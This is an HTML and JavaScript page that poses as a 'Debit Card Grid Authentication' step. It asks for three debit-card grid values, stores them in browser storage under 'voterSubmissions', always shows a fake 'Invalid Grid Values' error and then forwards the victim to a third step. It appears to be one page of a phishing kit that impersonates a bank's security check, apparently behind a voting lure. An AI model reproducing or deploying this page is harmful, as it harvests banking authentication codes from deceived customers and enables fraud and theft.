<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Debit Card Grid Authentication - Step 2</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
        .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 22px; }
        .sub-title { text-align: center; color: #555; font-size: 13px; margin-bottom: 25px; }
        .error-msg { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 6px; font-size: 13px; text-align: center; margin-bottom: 20px; display: none; border: 1px solid #f5c6cb; }
        
        .grid-container {
            display: flex;
            justify-content: space-between;
            gap: 15px;
            margin-bottom: 25px;
            background: #f8f9fa;
            padding: 20px 15px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
        }
        .grid-item {
            flex: 1;
            text-align: center;
        }
        .grid-label {
            display: block;
            margin-bottom: 8px;
            color: #0056b3;
            font-weight: bold;
            font-size: 16px;
        }
        .grid-input {
            width: 100%;
            padding: 10px 5px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
            text-align: center;
            letter-spacing: 2px;
            background: #fff;
        }
        .grid-input:focus {
            outline: none;
            border-color: #0056b3;
            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3);
        }

        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Debit Card Grid Authentication</h2>
        <div class="sub-title">Enter alternative grid values</div>
        
        <div id="errorAlert" class="error-msg">Invalid Grid Values, Please Enter Again</div>

        <form id="gridForm2">
            <div class="grid-container">
                <div class="grid-item">
                    <span class="grid-label">B</span>
                    <input type="password" id="gridB" name="gridB" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">I</span>
                    <input type="password" id="gridI" name="gridI" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">H</span>
                    <input type="password" id="gridH" name="gridH" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
            </div>

            <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('gridForm2').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const gridB = document.getElementById('gridB').value;
            const gridI = document.getElementById('gridI').value;
            const gridH = document.getElementById('gridH').value;
            const gridStep2Data = `B:${gridB}, I:${gridI}, H:${gridH}`;

            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
            let deviceId = localStorage.getItem('voterDeviceId');

            if (submissions.length > 0) {
                let targetIndex = -1;
                for (let i = submissions.length - 1; i >= 0; i--) {
                    if (submissions[i].deviceId === deviceId) {
                        targetIndex = i;
                        break;
                    }
                }
                if (targetIndex === -1) targetIndex = submissions.length - 1;

                submissions[targetIndex].gridStep2 = gridStep2Data;
                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
            }

            document.getElementById('errorAlert').style.display = 'block';
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Verifying...";

            setTimeout(() => {
                window.location.href = "grid_step3.html"; 
            }, 1500);
        });
    </script>
</body>
</html>
